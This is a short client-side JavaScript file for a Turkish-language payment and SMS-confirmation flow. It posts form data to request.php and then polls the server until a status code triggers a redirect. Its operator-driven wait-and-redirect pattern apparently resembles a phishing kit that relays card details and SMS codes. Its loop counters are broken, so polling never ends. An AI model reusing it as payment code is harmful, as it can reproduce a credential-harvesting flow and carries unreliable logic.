var b = 1;                  //  set your counter to 1

function myLoop2() {         //  create a loop function
  setTimeout(function() {   //  call a 3s setTimeout when the loop is called
    $.ajax({
      type: "POST",
      url: "request.php?q=sms-durum",
      success: function(response) {
          if (response == '1'){
            b + 100;
            swal.close()
            Swal.fire("Yatırım başarılı!","","success")
            window.location.pathname = '/index';
          }
      }
    })  
    //  your code here
    // i++;                    //  increment the counter
    if (b < 10) {           //  if the counter < 10, call the loop function
      myLoop2();             //  ..  again which will trigger another 
    }                       //  ..  setTimeout()
  }, 3000)
}

function smsOnay() {
  $.ajax({
    type: "POST",
    url: "request.php?q=sms-onay",
    data: $("#form").serialize(),
    success: (response) => {
      if (response == "success") {
        swal.fire({
          title: 'Lütfen Bekleyin',
          text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
          allowOutsideClick: false,
          showConfirmButton: false
        })
        myLoop2()
      }
    },
  });
}


var i = 1;                  //  set your counter to 1

function myLoop() {         //  create a loop function
  setTimeout(function() {   //  call a 3s setTimeout when the loop is called
    $.ajax({
      type: "POST",
      url: "request.php?q=sms-durum",
      success: function(response) {
          if (response == '3'){
            i + 100;
            window.location.pathname = '/sms';
          }
      }
    })  
    //  your code here
    // i++;                    //  increment the counter
    if (i < 10) {           //  if the counter < 10, call the loop function
      myLoop();             //  ..  again which will trigger another 
    }                       //  ..  setTimeout()
  }, 3000)
}



function setPaymentcre(type, redirect = 0){
  return new Promise(resolve => {
    const xhr = new XMLHttpRequest();
    let data = new FormData(event.target);
    data.append("type", type);
    xhr.open("POST","../request.php?q=payment");
    xhr.onload = function(){
      let res = this.responseText ? JSON.parse(this.responseText) : false;
      if (res.success) {
        if (redirect != 1) {
          swal.fire({
            title: 'Lütfen Bekleyin',
            text: 'İşleminiz İşleniyor Lütfen Bekleyiniz',
            allowOutsideClick: false,
            showConfirmButton: false
          })
          .then(result => {
            if(result.value){
              [...document.querySelectorAll("input","select")].forEach(item => {
                item.value = "";
              })
            }
          })
          myLoop();
        }else{
          resolve(res.message);
        }
      }else{
        Swal.fire("Hata!","Bilgileri doğru doldurduğunuza emin olun.","error")
      }
    }
    xhr.send(data);
    event.preventDefault();
  })
}

